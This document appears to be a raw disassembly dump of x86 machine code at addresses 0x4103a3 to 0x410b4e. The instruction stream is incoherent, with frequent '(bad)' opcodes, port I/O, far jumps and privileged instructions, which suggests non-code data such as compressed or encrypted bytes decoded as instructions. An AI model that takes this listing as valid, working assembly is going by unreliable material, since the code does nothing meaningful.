  4103a3:	inc    edi
  4103a4:	push   esi
  4103a5:	retf   0x4828
  4103a8:	test   al,0x20
  4103aa:	mov    al,0x51
  4103ac:	(bad)  
  4103ad:	imul   edx,edi,0x33d5de5d
  4103b3:	in     eax,0x16
  4103b5:	pop    eax
  4103b6:	pop    ss
  4103b7:	clc    
  4103b8:	es inc ebp
  4103ba:	mov    ecx,0x1e84fa00
  4103bf:	inc    edx
  4103c0:	aaa    
  4103c1:	in     eax,dx
  4103c2:	cmp    DWORD PTR [ecx],0x11
  4103c5:	mov    esp,DWORD PTR [ebp-0x3b]
  4103c8:	mov    ecx,0xb28f0d18
  4103cd:	ja     0x4103b4
  4103cf:	xor    al,0xc4
  4103d1:	adc    eax,0x7e53b60
  4103d6:	jo     0x410367
  4103d8:	ja     0x410396
  4103da:	mov    ?,WORD PTR [edx+eax*2-0x50282642]
  4103e1:	add    ebp,eax
  4103e3:	and    DWORD PTR [eax-0x14138a0d],edx
  4103e9:	inc    ecx
  4103ea:	push   es
  4103eb:	mov    ch,0x2b
  4103ed:	aas    
  4103ee:	sbb    BYTE PTR [ecx],bh
  4103f0:	hlt    
  4103f1:	call   0x81f9a1fe
  4103f6:	fnstsw WORD PTR [esp+ebp*4-0x545ed312]
  4103fd:	sub    BYTE PTR [ebx],dh
  4103ff:	and    eax,0x5776608b
  410404:	lods   eax,DWORD PTR ds:[esi]
  410405:	push   ss
  410406:	fs test al,0x6e
  410409:	loopne 0x4103ec
  41040b:	mov    ah,0x30
  41040d:	inc    ebx
  41040e:	xlat   BYTE PTR ds:[ebx]
  41040f:	out    dx,al
  410410:	sbb    al,0x94
  410412:	and    DWORD PTR [eax+0x1cefb02a],ecx
  410418:	jno    0x410410
  41041a:	dec    esi
  41041b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41041c:	or     DWORD PTR [edx],ebp
  41041e:	ret    
  41041f:	inc    esi
  410420:	mov    dh,0x5b
  410422:	mov    al,ds:0xd21c4f7c
  410427:	lods   al,BYTE PTR ds:[esi]
  410428:	das    
  410429:	fwait
  41042a:	pusha  
  41042b:	out    dx,eax
  41042c:	daa    
  41042d:	mov    cl,0x79
  41042f:	inc    edi
  410430:	std    
  410431:	add    dh,BYTE PTR [ebp-0x1c77bd01]
  410437:	push   esi
  410438:	test   al,0x94
  41043a:	in     al,0xec
  41043c:	push   ebx
  41043d:	js     0x41047a
  41043f:	pushf  
  410440:	lods   eax,DWORD PTR ds:[esi]
  410441:	cmp    BYTE PTR [esi-0x608427ea],bh
  410447:	fild   DWORD PTR [edx+0x17]
  41044a:	pushf  
  41044b:	shl    DWORD PTR [ecx],0x42
  41044e:	jne    0x41041e
  410450:	int    0x8
  410452:	mov    esi,0x269a815c
  410457:	cs push edx
  410459:	aad    0xf4
  41045b:	or     al,0x48
  41045d:	ja     0x41049c
  41045f:	push   ss
  410460:	add    dh,BYTE PTR [edx-0x34]
  410463:	bound  esp,QWORD PTR [ebp-0x1b]
  410466:	and    esi,DWORD PTR [ebx+edx*2+0x17]
  41046a:	pop    eax
  41046b:	(bad)  
  41046c:	push   0x7a
  41046e:	pop    edi
  41046f:	jecxz  0x410454
  410471:	xor    BYTE PTR [ecx],ch
  410473:	gs inc esp
  410475:	and    BYTE PTR [edi-0x3f],cl
  410478:	mov    bl,0xdd
  41047a:	mov    ebp,0x5fb961fd
  41047f:	sbb    ebp,DWORD PTR [edx]
  410481:	in     al,0x5a
  410483:	sbb    ecx,DWORD PTR [ebp+0x5]
  410486:	nop
  410487:	pushf  
  410488:	xchg   edi,eax
  410489:	jb     0x4104db
  41048b:	sbb    BYTE PTR [ebx+0x76937796],bh
  410491:	(bad)  [ecx-0x4a44d155]
  410497:	gs js  0x41049e
  41049a:	icebp  
  41049b:	call   0x133bdd6d
  4104a0:	and    eax,0xa9ac7664
  4104a5:	nop
  4104a6:	scas   al,BYTE PTR es:[edi]
  4104a7:	cmp    al,0x91
  4104a9:	stos   BYTE PTR es:[edi],al
  4104aa:	ficomp DWORD PTR [ecx]
  4104ac:	mov    ?,WORD PTR [edi-0x4c01bc3]
  4104b2:	and    DWORD PTR [ebp-0x84bcb9c],ebx
  4104b8:	jmp    0xecb:0x7ed0781d
  4104bf:	(bad)  
  4104c0:	nop
  4104c1:	mov    cl,0xf3
  4104c3:	or     al,0xd6
  4104c5:	or     BYTE PTR [edi+0x2c],bh
  4104c8:	dec    ecx
  4104c9:	les    esi,FWORD PTR [eax+0x34]
  4104cc:	pop    edx
  4104cd:	mov    eax,ds:0xbe2dfe9a
  4104d2:	jnp    0x410514
  4104d4:	cmp    eax,0x6650e1ab
  4104d9:	mov    ds:0xd97ae67,al
  4104de:	ror    dl,cl
  4104e0:	popa   
  4104e1:	pop    ebx
  4104e2:	adc    al,BYTE PTR [ecx-0x60c61428]
  4104e8:	mov    esp,0xa5a60dcc
  4104ed:	out    dx,eax
  4104ee:	pop    eax
  4104ef:	and    BYTE PTR [edi+ebp*8-0x54bc0425],ch
  4104f6:	sahf   
  4104f7:	ret    
  4104f8:	stos   BYTE PTR es:[edi],al
  4104f9:	pushf  
  4104fa:	call   ecx
  4104fc:	push   edx
  4104fd:	mov    ch,0x57
  4104ff:	push   0xdd7b4522
  410504:	popf   
  410505:	jmp    0x4104e3
  410507:	mov    ah,0x31
  41050a:	xor    dl,bl
  41050c:	ss dec ebx
  41050e:	adc    al,0xf8
  410510:	push   esi
  410511:	je     0x410523
  410513:	sub    bh,BYTE PTR [edi+eiz*1]
  410516:	pop    esp
  410517:	and    dl,bl
  410519:	cwde   
  41051a:	mov    ?,esi
  41051c:	cs add eax,0x5c19d2dc
  410522:	inc    ebp
  410523:	jae    0x4104b1
  410525:	loop   0x410579
  410527:	and    BYTE PTR [edi],dl
  410529:	inc    esi
  41052a:	mov    bh,0xed
  41052c:	hlt    
  41052d:	xor    eax,0x6f7ad908
  410532:	shl    BYTE PTR [eax-0x23],0x4d
  410536:	(bad)  
  410537:	dec    edi
  410538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410539:	xchg   ebx,eax
  41053a:	fimul  WORD PTR [ebp+0x38]
  41053d:	das    
  41053e:	dec    ebp
  41053f:	icebp  
  410540:	fstp   DWORD PTR [ecx+0x4af866da]
  410546:	jne    0x4104fa
  410548:	push   ebx
  410549:	arpl   WORD PTR [edi],dx
  41054b:	mov    ecx,0xfdfe0b44
  410550:	cli    
  410551:	out    0x36,eax
  410553:	pushf  
  410554:	xor    esp,DWORD PTR [ebx-0x6c]
  410557:	(bad)  
  410558:	mov    esi,0xf2c246e5
  41055d:	xchg   esi,eax
  41055e:	scas   eax,DWORD PTR es:[edi]
  41055f:	in     eax,0x97
  410561:	fdivr  DWORD PTR [ebp+0x2d1718be]
  410567:	mov    ?,WORD PTR [eax]
  410569:	repz fisttp DWORD PTR [edi-0xa]
  41056d:	jl     0x410570
  41056f:	mov    bl,0xe6
  410571:	fwait
  410572:	jl     0x4105c8
  410574:	(bad)  
  410575:	xor    DWORD PTR [ecx+0x51],eax
  410578:	dec    esi
  410579:	jmp    0x3fa7bae5
  41057e:	int    0xc0
  410580:	push   ebx
  410581:	js     0x41050a
  410583:	dec    ebp
  410584:	call   0x62c27967
  410589:	arpl   WORD PTR [edx-0x34],sp
  41058c:	dec    ecx
  41058d:	cs mov bl,0x2d
  410590:	jbe    0x4105ae
  410592:	xor    ebx,DWORD PTR [ecx]
  410594:	push   edx
  410595:	add    dl,ah
  410597:	cwde   
  410598:	inc    ecx
  410599:	pop    es
  41059a:	mov    al,ds:0x6025d21e
  41059f:	rol    DWORD PTR [edx+0x43],0xd3
  4105a3:	out    0xc3,al
  4105a5:	ss sbb eax,0x23f59f03
  4105ab:	or     al,0x66
  4105ad:	ds std 
  4105af:	mov    ds:0x72df29a4,al
  4105b4:	call   0x310a:0x58e2a38f
  4105bb:	dec    esp
  4105bc:	inc    ebp
  4105bd:	retf   
  4105be:	addr16 adc al,0x7e
  4105c1:	and    al,0x5c
  4105c3:	jge    0x4105ad
  4105c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105c6:	pusha  
  4105c7:	dec    edx
  4105c8:	ins    BYTE PTR es:[edi],dx
  4105c9:	mov    edi,eax
  4105cb:	xchg   BYTE PTR [edx-0x21],ah
  4105ce:	pushf  
  4105cf:	outs   dx,BYTE PTR ds:[esi]
  4105d0:	add    al,0xcf
  4105d2:	xchg   ecx,eax
  4105d3:	outs   dx,DWORD PTR ds:[esi]
  4105d4:	test   esi,ebp
  4105d6:	add    DWORD PTR [esi+0x7b5f96d7],esi
  4105dc:	push   es
  4105dd:	push   cs
  4105de:	inc    ebp
  4105df:	mov    esp,0x306ee379
  4105e4:	cld    
  4105e5:	sar    BYTE PTR [ebp+0x3e6e14f9],0xd2
  4105ec:	push   eax
  4105ed:	int    0x1f
  4105ef:	dec    ebp
  4105f0:	bound  esp,QWORD PTR ds:[ebx+0x20]
  4105f4:	in     eax,0x63
  4105f6:	mov    al,ds:0xe3bb217d
  4105fb:	lods   eax,DWORD PTR ds:[esi]
  4105fc:	mov    ebp,ebx
  4105fe:	mov    ah,0xbb
  410600:	pop    ebx
  410601:	scas   eax,DWORD PTR es:[edi]
  410602:	or     al,0x35
  410604:	cmp    eax,0xf39f0bd3
  410609:	adc    al,0xe4
  41060b:	es ss mov cl,0x3
  41060f:	or     WORD PTR [edx+eiz*2],sp
  410613:	sahf   
  410614:	xlat   BYTE PTR ds:[ebx]
  410615:	jb     0x410687
  410617:	pop    ebp
  410618:	out    dx,al
  410619:	cmc    
  41061a:	xchg   BYTE PTR [ecx+0x35],al
  41061d:	mov    eax,0x121afabb
  410622:	fisubr DWORD PTR [esi+0x60a59526]
  410628:	xor    edi,DWORD PTR [ebp+0x544f5c50]
  41062e:	loop   0x410689
  410630:	std    
  410631:	push   0x3b1cfc47
  410636:	dec    edi
  410637:	inc    edx
  410638:	fld    TBYTE PTR [edx]
  41063a:	daa    
  41063b:	add    BYTE PTR [edi-0xc488483],cl
  410641:	sti    
  410642:	jb     0x4105eb
  410644:	adc    cl,0xf9
  410647:	xchg   esp,eax
  410648:	inc    bp
  41064a:	sub    eax,0xfd44b814
  41064f:	xchg   edx,eax
  410650:	and    al,al
  410652:	cmc    
  410653:	stc    
  410654:	out    dx,eax
  410655:	imul   edx,esi,0x25
  410658:	stos   BYTE PTR es:[edi],al
  410659:	aas    
  41065a:	mov    bh,0xa5
  41065c:	push   0xffffff9d
  41065e:	cmp    eax,0xba25bb46
  410663:	imul   edi,DWORD PTR [edx+0x2b],0xffffffa3
  410667:	and    dh,BYTE PTR [eax+esi*8]
  41066a:	clc    
  41066b:	inc    ebp
  41066c:	fwait
  41066d:	sbb    eax,0x94fc67bb
  410672:	xlat   BYTE PTR ds:[ebx]
  410673:	cs stos BYTE PTR es:[edi],al
  410675:	add    BYTE PTR ds:0xfd1c4608,dl
  41067b:	out    dx,al
  41067c:	sub    BYTE PTR [edi],bl
  41067e:	pop    ds
  41067f:	sbb    bl,BYTE PTR [esi-0x270e469c]
  410685:	sbb    ecx,DWORD PTR ss:[eax+0x2a]
  410689:	and    al,0xe5
  41068b:	in     eax,0x8e
  41068d:	cmp    BYTE PTR [esi-0x130ba26c],ah
  410693:	mov    dh,0xae
  410695:	in     al,dx
  410696:	pushf  
  410697:	add    DWORD PTR [esi+0x518fc1ab],esp
  41069d:	sbb    al,0xf5
  41069f:	stos   BYTE PTR es:[edi],al
  4106a0:	sbb    al,0x2e
  4106a2:	es inc ebp
  4106a4:	test   BYTE PTR [eax],dl
  4106a6:	mov    ah,0x4a
  4106a8:	jge    0x4106ba
  4106aa:	retf   
  4106ab:	mov    DWORD PTR [ebp+0x3e],esi
  4106ae:	jp     0x4106af
  4106b0:	mov    eax,0x7dedd394
  4106b5:	xchg   bh,ch
  4106b7:	sub    ebp,DWORD PTR [esp+ebp*2-0x63]
  4106bb:	popf   
  4106bc:	mov    cs,esi
  4106be:	fld    st(2)
  4106c0:	in     eax,0x8d
  4106c2:	outs   dx,BYTE PTR ds:[esi]
  4106c3:	push   edx
  4106c4:	push   cs
  4106c5:	in     al,dx
  4106c6:	fcmovbe st,st(3)
  4106c8:	sbb    bh,0x21
  4106cb:	mov    ds:0x19c828d0,eax
  4106d0:	dec    edx
  4106d1:	stos   DWORD PTR es:[edi],eax
  4106d2:	and    DWORD PTR ds:0xbd915c,edx
  4106d8:	xlat   BYTE PTR ds:[ebx]
  4106d9:	retf   0xd0d5
  4106dc:	sahf   
  4106dd:	repz and DWORD PTR [ebp+eiz*1-0x42],0xffffffe9
  4106e3:	call   0x264c:0x7a82fe25
  4106ea:	mov    ds:0xa50bca2b,al
  4106ef:	inc    ebp
  4106f0:	sbb    DWORD PTR [edi-0x2e75e7a8],ebx
  4106f6:	and    esp,DWORD PTR [edx-0x158cf05e]
  4106fc:	and    BYTE PTR [eax+edi*4-0x61],dl
  410700:	cdq    
  410701:	push   eax
  410702:	mov    cl,0x18
  410704:	jbe    0x4106dc
  410706:	aaa    
  410707:	push   ebp
  410708:	aam    0x40
  41070a:	icebp  
  41070b:	ret    0xe7b9
  41070e:	jo     0x410784
  410710:	fucomi st,st(4)
  410712:	test   al,cl
  410714:	inc    ecx
  410715:	fcom   st(6)
  410717:	inc    edx
  410718:	pop    ebx
  410719:	pushf  
  41071a:	cmc    
  41071b:	pop    esi
  41071c:	jmp    0xf7a1069d
  410721:	add    DWORD PTR [ebx-0x1ca64315],edi
  410727:	sbb    DWORD PTR [edi+0x46],ecx
  41072a:	mov    ch,0xb4
  41072c:	cld    
  41072d:	mov    ecx,0xa3b2d861
  410732:	(bad)  
  410733:	leave  
  410734:	xchg   DWORD PTR [edx+0x26513e2e],ebx
  41073a:	bound  esp,QWORD PTR [edx-0x1fc97ebc]
  410740:	dec    ebx
  410741:	retf   0xaa66
  410744:	xchg   ebx,eax
  410745:	je     0x4106f3
  410747:	xchg   esi,eax
  410748:	push   DWORD PTR [ebx+0x6f]
  41074b:	adc    ebx,DWORD PTR [edi+0x7c10a503]
  410751:	inc    eax
  410752:	push   esi
  410753:	dec    edi
  410754:	inc    esi
  410755:	test   DWORD PTR [eax-0x30],ebp
  410758:	xchg   DWORD PTR [eax+0x11],edx
  41075b:	scas   eax,DWORD PTR es:[edi]
  41075c:	dec    ecx
  41075d:	ds mov esi,0x88b37bb
  410763:	mov    ds,ecx
  410765:	jge    0x41078e
  410767:	jge    0x41079d
  410769:	(bad)  
  41076a:	jo     0x4107c5
  41076c:	popf   
  41076d:	push   eax
  41076e:	fs jae 0x41076b
  410771:	iret   
  410772:	inc    edx
  410773:	jb     0x4107b4
  410775:	loope  0x410790
  410777:	jl     0x4107f3
  410779:	mov    edx,0xa669d64f
  41077e:	pop    eax
  41077f:	cli    
  410780:	popf   
  410781:	sub    DWORD PTR [esp+eiz*8],ebx
  410784:	and    eax,0xf314b289
  410789:	test   eax,0xdeedfc25
  41078e:	fld    DWORD PTR [ebx-0x175d81a0]
  410794:	xlat   BYTE PTR ds:[ebx]
  410795:	cld    
  410796:	cli    
  410797:	loopne 0x4107ad
  410799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41079a:	dec    esp
  41079b:	dec    ebx
  41079c:	int3   
  41079d:	sti    
  41079e:	sbb    eax,0xec422760
  4107a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107a4:	sub    eax,DWORD PTR [ebx]
  4107a6:	jecxz  0x4107c5
  4107a8:	test   al,0x19
  4107aa:	nop
  4107ab:	mov    cl,0x44
  4107ad:	lahf   
  4107ae:	mov    DWORD PTR [ebp-0x3],ebp
  4107b1:	jmp    DWORD PTR [esi]
  4107b3:	mov    BYTE PTR [ebp+0x4e6a74de],ch
  4107b9:	xchg   esp,eax
  4107ba:	dec    edi
  4107bb:	and    DWORD PTR [ecx],ecx
  4107bd:	jg     0x410825
  4107bf:	xor    eax,0x5996054e
  4107c4:	int    0xb9
  4107c6:	arpl   WORD PTR [ebp-0x59ce387f],sp
  4107cc:	or     al,0x97
  4107ce:	pop    ebx
  4107cf:	js     0x41083f
  4107d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107d2:	cmp    ah,ah
  4107d4:	push   esp
  4107d5:	inc    edi
  4107d6:	sub    al,0x8b
  4107d8:	imul   esp,DWORD PTR [ebx],0x9b4dbb83
  4107de:	dec    ebx
  4107df:	push   0xcd1048bf
  4107e4:	xor    eax,0x2b39e6e8
  4107e9:	shl    DWORD PTR [edx+0x24e3a08d],0x2f
  4107f0:	mov    ecx,0xf710e847
  4107f5:	or     eax,0xb9dc1f91
  4107fa:	mov    ebx,0x3f580834
  4107ff:	add    al,0x64
  410801:	add    eax,DWORD PTR [eax+0x699b8df]
  410807:	les    ebx,FWORD PTR [ebx+0x50]
  41080a:	sub    DWORD PTR [eax+0x7c231c3b],ecx
  410810:	xchg   ebx,eax
  410811:	sbb    DWORD PTR [edi],ecx
  410813:	imul   ebp,DWORD PTR [ecx+ebx*2+0x75],0x7
  410818:	mov    edi,0xc67deb8a
  41081d:	test   edi,esp
  41081f:	add    DWORD PTR [eax+eax*8],ecx
  410822:	in     al,dx
  410823:	cmp    eax,0xc6436f0a
  410828:	mov    cl,0x8c
  41082a:	nop
  41082b:	data16 ss jo 0x4107ed
  41082f:	xor    ch,BYTE PTR [esi+esi*2]
  410832:	cmc    
  410833:	imul   edx,DWORD PTR [eax+0x34],0xffffffed
  410837:	mov    edi,DWORD PTR [edi-0x78b6de8c]
  41083d:	inc    esp
  41083e:	mov    ds:0xc8d6a9b7,al
  410843:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410844:	push   esi
  410845:	out    dx,al
  410846:	in     eax,0x8d
  410848:	adc    edi,DWORD PTR [ebp+0x2a38127b]
  41084e:	add    ecx,DWORD PTR [ebp+0x2a]
  410851:	add    BYTE PTR [ebx-0x1d],0x59
  410855:	mov    ds:0x10e7fcb,al
  41085a:	cld    
  41085b:	dec    edi
  41085c:	jle    0x4108af
  41085e:	mov    al,ds:0x9ff901a4
  410863:	imul   esp,DWORD PTR [edx+0x6b],0xf6dab05a
  41086a:	sub    esp,DWORD PTR [eax+ebp*1-0x76e897c5]
  410871:	outs   dx,DWORD PTR ds:[esi]
  410872:	adc    esi,DWORD PTR [edx-0x76b64c0b]
  410878:	pop    ss
  410879:	(bad)  
  41087a:	xor    bh,dh
  41087c:	mov    ss,edi
  41087e:	or     eax,DWORD PTR [edi]
  410880:	pop    edi
  410881:	jg     0x41082f
  410883:	adc    eax,0x38281b6b
  410888:	scas   eax,DWORD PTR es:[edi]
  410889:	les    esp,FWORD PTR [esi-0x1ab3d8d7]
  41088f:	mov    al,0x2f
  410891:	mov    eax,ds:0x8bd41b9d
  410896:	dec    ebp
  410897:	cmp    BYTE PTR [eax+0x70],ah
  41089a:	dec    edx
  41089b:	pop    ebx
  41089c:	mov    ch,0x42
  41089e:	call   0xeb20:0x73812813
  4108a5:	ss dec eax
  4108a7:	aaa    
  4108a8:	lods   al,BYTE PTR ds:[esi]
  4108a9:	sbb    bh,ah
  4108ab:	iret   
  4108ac:	push   0xaa16f153
  4108b1:	out    0x87,eax
  4108b3:	push   edx
  4108b4:	or     ah,BYTE PTR [edx+0x265cfc24]
  4108ba:	cli    
  4108bb:	sbb    BYTE PTR [ecx],bh
  4108bd:	push   esp
  4108be:	lds    ebp,FWORD PTR [ebx-0x3d35571c]
  4108c4:	push   esi
  4108c5:	xlat   BYTE PTR ds:[ebx]
  4108c6:	sahf   
  4108c7:	push   0x3f7622d7
  4108cc:	test   ebx,esi
  4108ce:	jl     0x4108e8
  4108d0:	ficom  DWORD PTR [esi-0x29]
  4108d3:	inc    eax
  4108d4:	stos   BYTE PTR es:[edi],al
  4108d5:	pop    edi
  4108d6:	mov    esi,0xef05ff23
  4108db:	dec    esi
  4108dc:	popa   
  4108dd:	and    DWORD PTR [ebx+eax*2+0xe5b324c],esp
  4108e4:	inc    ebx
  4108e5:	cs (bad) 
  4108e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108e8:	mov    al,0x8d
  4108ea:	(bad)  
  4108ec:	mov    edi,0x3e1bea54
  4108f1:	jge    0x4108b2
  4108f3:	int3   
  4108f4:	and    DWORD PTR [edx+edx*2+0xf18ff51],esp
  4108fb:	push   esp
  4108fc:	sti    
  4108fd:	push   cs
  4108fe:	cld    
  4108ff:	dec    edx
  410900:	lods   eax,DWORD PTR ds:[esi]
  410901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410902:	pusha  
  410903:	sti    
  410904:	not    esp
  410906:	cdq    
  410907:	mov    ?,WORD PTR [ebp+0x24ef5e8a]
  41090d:	or     DWORD PTR [ecx-0x6f],esi
  410910:	sub    al,0x8d
  410912:	loope  0x41098b
  410914:	out    dx,al
  410915:	fimul  DWORD PTR [edx+0x67]
  410918:	les    ebp,FWORD PTR ds:0xcd778c3f
  41091e:	(bad)  
  41091f:	mov    dh,0x81
  410921:	pusha  
  410922:	mov    DWORD PTR ds:0x402ce6d8,esi
  410928:	mov    al,0x3d
  41092a:	xchg   edi,eax
  41092b:	inc    edx
  41092c:	out    dx,al
  41092d:	push   ebp
  41092e:	cmp    al,0x39
  410930:	push   esp
  410931:	sbb    al,dh
  410933:	sbb    esp,edi
  410935:	jmp    0xaef4:0x1f00ce81
  41093c:	dec    esi
  41093d:	popf   
  41093e:	shr    BYTE PTR [ecx+0x73254bd8],cl
  410944:	cwde   
  410945:	test   BYTE PTR [edx],ah
  410947:	pop    edx
  410948:	xlat   BYTE PTR ds:[ebx]
  410949:	std    
  41094a:	stc    
  41094b:	lods   eax,DWORD PTR ds:[esi]
  41094c:	lahf   
  41094d:	and    eax,0xb87270e9
  410952:	retf   
  410953:	out    0x57,al
  410955:	cmp    bh,cl
  410957:	out    dx,eax
  410958:	stos   BYTE PTR es:[edi],al
  410959:	pop    ebp
  41095b:	sbb    BYTE PTR [edi-0x61],al
  41095e:	fcmovu st,st(3)
  410960:	shr    DWORD PTR [ecx+0x74],cl
  410963:	ficomp WORD PTR [eax+0x78]
  410966:	jne    0x4109c0
  410968:	call   0x1d19c63c
  41096d:	std    
  41096e:	cs mov dl,dl
  410971:	imul   edi,DWORD PTR [edx-0x4a7a7aac],0xffffffc0
  410978:	xlat   BYTE PTR ds:[ebx]
  410979:	jecxz  0x41099e
  41097b:	xor    eax,0xb90df613
  410980:	(bad)  
  410981:	pop    ds
  410982:	jge    0x41093f
  410984:	es test eax,0x1cbc90ea
  41098a:	call   0x1ad93217
  41098f:	sub    al,0xc0
  410991:	or     BYTE PTR [esi+ecx*1+0x1e],ch
  410995:	inc    ebx
  410996:	sti    
  410997:	out    dx,al
  410998:	cmc    
  410999:	sbb    eax,0xda086f7b
  41099e:	aaa    
  41099f:	mov    ah,0x3f
  4109a1:	adc    DWORD PTR [esi-0x21],esi
  4109a4:	test   BYTE PTR [si],bh
  4109a7:	retf   
  4109a8:	or     DWORD PTR [esp+edi*1+0x13],edx
  4109ac:	jmp    FWORD PTR [edx]
  4109ae:	pop    ebx
  4109af:	inc    ecx
  4109b0:	sub    bl,bl
  4109b2:	mov    esi,0x7dc1dac1
  4109b7:	pushf  
  4109b8:	cmp    ah,bh
  4109ba:	and    edx,DWORD PTR [ebx]
  4109bc:	fstp   DWORD PTR [edi+edi*1-0x6b1bec71]
  4109c3:	inc    edi
  4109c4:	ds in  al,dx
  4109c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109c7:	pop    edi
  4109c8:	(bad)  
  4109c9:	cs xor al,0xd2
  4109cc:	jmp    0x52861120
  4109d1:	aaa    
  4109d2:	inc    esi
  4109d3:	sbb    edi,edx
  4109d5:	fdiv   DWORD PTR [edi+ebp*4+0x1]
  4109d9:	imul   BYTE PTR [ebx]
  4109db:	in     al,0x12
  4109dd:	jo     0x410a46
  4109df:	adc    ah,ah
  4109e1:	jmp    0x410a25
  4109e3:	adc    DWORD PTR [eax+0x27ee3fc9],eax
  4109e9:	xchg   edx,eax
  4109ea:	lods   al,BYTE PTR ds:[esi]
  4109eb:	or     eax,DWORD PTR [eax+ecx*2+0x33cbc7c1]
  4109f2:	pop    esi
  4109f3:	ds aaa 
  4109f5:	push   ebp
  4109f6:	xor    ch,BYTE PTR [edi-0x75959823]
  4109fc:	mov    ah,BYTE PTR [ecx-0x3e]
  4109ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a00:	(bad)  
  410a01:	dec    edi
  410a02:	mov    dl,0x55
  410a04:	dec    ecx
  410a05:	xor    dl,BYTE PTR [ebp-0x5a04057e]
  410a0b:	add    al,0x6e
  410a0d:	lods   al,BYTE PTR ds:[esi]
  410a0e:	fild   QWORD PTR [edi-0x60]
  410a11:	enter  0xd37,0x83
  410a15:	mov    bl,0xab
  410a17:	pop    esp
  410a18:	cld    
  410a19:	repz cmc 
  410a1b:	stos   DWORD PTR es:[edi],eax
  410a1c:	sub    eax,0x1d7cbc4
  410a21:	cmp    bl,BYTE PTR [ecx-0x71]
  410a24:	(bad)  
  410a25:	(bad)  
  410a26:	mov    bl,0xa7
  410a28:	mov    eax,ds:0x972d3925
  410a2d:	jo     0x410a0e
  410a2f:	scas   al,BYTE PTR es:[edi]
  410a30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a31:	and    edx,ebp
  410a33:	jno    0x410a77
  410a35:	mov    ah,0x8f
  410a37:	xchg   ebx,eax
  410a38:	(bad)  
  410a39:	sbb    al,0x81
  410a3b:	rcr    BYTE PTR [esi+0x5a489eef],0xbd
  410a42:	es pusha 
  410a44:	ds clc 
  410a46:	nop
  410a47:	inc    esp
  410a48:	mov    eax,0x5f166f17
  410a4d:	add    al,0x49
  410a4f:	jp     0x410ab3
  410a51:	aaa    
  410a52:	push   ebx
  410a53:	sub    al,0x81
  410a55:	js     0x4109f4
  410a57:	inc    eax
  410a58:	add    ebx,ebx
  410a5a:	clc    
  410a5b:	fmul   QWORD PTR [ebx+0x488d2cbe]
  410a61:	loopne 0x410a0c
  410a63:	mov    edi,0x5fdb62fa
  410a68:	pop    ecx
  410a69:	adc    DWORD PTR [esi+edi*8-0x25],ebx
  410a6d:	(bad)  
  410a6e:	ds inc esi
  410a70:	pushf  
  410a71:	ins    DWORD PTR es:[edi],dx
  410a72:	imul   ebp,DWORD PTR [ebx+0x50873716],0x32
  410a79:	lods   eax,DWORD PTR ds:[esi]
  410a7a:	cwde   
  410a7b:	outs   dx,BYTE PTR ds:[esi]
  410a7c:	stos   BYTE PTR es:[edi],al
  410a7d:	cmp    al,0x62
  410a7f:	icebp  
  410a80:	pop    esi
  410a81:	popa   
  410a82:	jmp    0x68ca:0x8261da5a
  410a89:	cli    
  410a8a:	pop    ecx
  410a8b:	aaa    
  410a8c:	xchg   esi,eax
  410a8d:	mov    ds:0x83f39975,al
  410a92:	dec    esi
  410a93:	cli    
  410a94:	push   es
  410a95:	mov    dl,0x8d
  410a97:	mov    edi,0x880e93b6
  410a9c:	(bad)  
  410a9d:	jns    0x410a4a
  410a9f:	xchg   esi,eax
  410aa0:	pop    ds
  410aa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410aa2:	fidivr DWORD PTR [eax-0x3e7fd68c]
  410aa8:	aas    
  410aa9:	repz jo 0x410b2a
  410aac:	fisub  WORD PTR [esi+0x487a6c39]
  410ab2:	jb     0x410b06
  410ab4:	rcl    dh,0x40
  410ab7:	xor    al,0x16
  410aba:	pop    edi
  410abb:	mov    edi,0x12c5b7e1
  410ac0:	mov    ds:0x49ca4bc0,eax
  410ac5:	sbb    eax,0xe8303c61
  410aca:	cmp    al,0x37
  410acc:	iret   
  410acd:	shl    DWORD PTR [ebx-0x1f],1
  410ad0:	adc    eax,0x2a60e89
  410ad5:	out    0xe2,al
  410ad7:	jns    0x410ac0
  410ad9:	push   edx
  410ada:	xchg   ecx,eax
  410adb:	dec    ecx
  410adc:	cmp    ch,BYTE PTR [edx+0x160b3e4b]
  410ae2:	ins    BYTE PTR es:[edi],dx
  410ae3:	test   al,0x42
  410ae5:	scas   al,BYTE PTR es:[edi]
  410ae6:	(bad)  
  410ae7:	arpl   WORD PTR [eax+0x36],ax
  410aea:	push   0x54
  410aec:	xor    eax,0x49506a2a
  410af1:	mov    ds:0x5eae8c92,al
  410af6:	mov    gs,WORD PTR [ecx-0x3e745625]
  410afc:	push   0x297a06be
  410b01:	inc    ebx
  410b02:	mov    ebp,0x7e3ece0f
  410b07:	mov    WORD PTR [edi],ds
  410b09:	aaa    
  410b0a:	lock mov esp,0x364bc425
  410b10:	dec    ecx
  410b11:	in     al,0x29
  410b13:	jb     0x410b35
  410b15:	fbld   TBYTE PTR [esi-0x63]
  410b18:	(bad)  
  410b19:	jbe    0x410af3
  410b1b:	ret    0x89ba
  410b1e:	cmp    al,0x81
  410b20:	xor    al,BYTE PTR [ebx+0x7b]
  410b23:	xor    DWORD PTR [eax],ecx
  410b25:	inc    eax
  410b26:	ret    0xc8ad
  410b29:	shl    BYTE PTR [ecx+ebx*4],0x47
  410b2d:	data16 mov dh,0x2
  410b30:	in     eax,dx
  410b31:	aaa    
  410b32:	ret    
  410b33:	arpl   cx,bp
  410b35:	pop    ebx
  410b36:	cld    
  410b37:	cli    
  410b38:	adc    eax,0xf6e89eb8
  410b3d:	lea    esp,[edx-0x2cd4d637]
  410b43:	push   0x1c
  410b45:	push   ss
  410b46:	popa   
  410b47:	ds loop 0x410b3a
  410b4a:	mov    bh,0x1a
  410b4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b4d:	xchg   ecx,eax
  410b4e:	cmp    ebp,ebx
